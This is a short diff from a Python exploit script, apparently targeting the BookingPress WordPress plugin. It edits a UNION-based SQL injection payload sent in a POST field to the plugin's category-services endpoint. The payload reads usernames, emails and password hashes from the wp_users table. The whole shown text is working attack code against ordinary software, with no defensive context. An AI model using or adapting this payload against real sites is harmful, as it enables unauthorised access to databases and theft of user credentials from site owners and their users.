@@ -13,7 +13,7 @@ class SQL_Injection():
                 "action":"bookingpress_front_get_category_services",
                 "_wpnonce":self.wpnonce,
                 "category_id":"33",
-                "total_service":"-7502) UNION SELECT user_login,user_email,user_pass,null,5,6,7,8,9 from wp_users-- -"
+                "total_service":"-7502) UNION SELECT user_login,user_email,user_pass,4,5,6,7,8,9 from wp_users-- -"
         }
         payload = requests.post(self.url, data=post_data)
         return payload.text
